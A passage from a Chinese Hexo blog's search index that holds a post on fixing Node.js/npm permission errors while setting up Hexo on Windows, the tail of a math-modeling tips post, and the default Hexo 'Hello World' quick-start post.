title="十四、特别注意"></a>十四、特别注意</h2><ul><li>WinRAR压缩</li><li>不要过分依赖智能算法，容易陷入局部最优值，如果使用，要极值检验</li><li>避免三把斧现象：层次分析、模糊综合评价、灰色预测与评价</li><li>一定要进行模型检验！！！</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模、论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客搭建踩坑</title>
      <link href="/2023/09/18/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/"/>
      <url>/2023/09/18/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<blockquote><p>由于网络上基于hexo+github的博客搭建框架已经记录非常详细，我的第一篇博客就记录一下搭建过程中遇到的问题。</p></blockquote><h2 id="一、Node-Js环境配置"><a href="#一、Node-Js环境配置" class="headerlink" title="一、Node.Js环境配置"></a>一、Node.Js环境配置</h2><p>Node.Js一定要注意环境变量的各种配置，具体参考博客：<a href="https://blog.csdn.net/weixin_44893902/article/details/121788104?spm=1001.2014.3001.5506"></a></p><p>以下展示关键点：</p><ul><li>​新建两个文件夹</li></ul><p>​<code>node_global</code></p><p>​<code>node_cache</code></p><p><img src="/2023/09/18/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/image-20230905144459747.png" alt="image-20230905144459747"></p><ul><li>​建立之后在管理员权限下config刚刚建立的文件夹，【目的是将利用npm下载的模块以及缓存放在这两个文件夹下】</li></ul><p>​<code>npm config set prefix &quot;node_global路径&quot;</code></p><p>​<code>npm config set cache &quot;node_cache路径&quot;</code></p><p>​剩余操作详见上述参考博文</p><h2 id="二、权限问题解决——INFO-Install-dependencies安装出错"><a href="#二、权限问题解决——INFO-Install-dependencies安装出错" class="headerlink" title="二、权限问题解决——INFO Install dependencies安装出错"></a>二、权限问题解决——INFO Install dependencies安装出错</h2><ul><li><p>具体报错：</p><p>- </p>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br><span class="line">INFO Cloning hexo-starter ![img](file:///C:\Users\Jake\AppData\Roaming\Tencent\QQTempSys\[5UQ[BL(6~BS2JV6W&#125;N6[%S.png)https://github.com/hexojs/hexo-starter.git</span><br><span class="line">INFO Install dependencies</span><br><span class="line"><span class="string">&#x27;npm&#x27;</span> is not recognized as an internal or external <span class="built_in">command</span>,</span><br><span class="line">operable program or batch file.</span><br><span class="line">WARN Failed to install dependencies. Please run <span class="string">&#x27;npm install&#x27;</span> <span class="keyword">in</span> <span class="string">&quot;E:\blog\env\blogs\smalltown_blog&quot;</span> folder.</span><br></pre></td></tr></table></figure><ul><li><p>但是nmp安装正确：</p><ul><li><img src="/2023/09/18/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/image-20230905155553009.png" alt="image-20230905155553009" style="zoom:80%;"></li></ul></li></ul></li><li><p>最关键的一点：修改&#x3D;&#x3D;这两个文件的权限&#x3D;&#x3D;</p><ul><li>原因：在node.js中，想要利用npm安装模块就需要在管理员权限下进行，但是为了方便文件管理，我们选择将文件放在其他磁盘中存储，而在其他位置cmd没有管理员权限</li><li>解决：将新增的两个模块的所有用户组权限全部提高到和管理员相同，操作如下：<ul><li><img src="/2023/09/18/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/image-20230905145837588.png" alt="image-20230905145837588"></li></ul></li></ul></li><li><p>修改完权限后，在再开始新建自己的博客文件夹【无所谓位置】，在这个空文件夹内 <code>git bash here</code></p></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br><span class="line"></span><br><span class="line">hexo -v <span class="comment">#查看hexo版本信息，查看是否安装成功</span></span><br></pre></td></tr></table></figure><p>​</p><p>其余参考超链接博文继续博客搭建：</p><p><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169388127516800225537680%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169388127516800225537680&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-82729029-null-null.142%5Ev93%5EchatgptT3_2&utm_term=hexo&spm=1018.2226.3001.4187"></a></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/09/18/hello-world/"/>
      <url>/2023/09/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
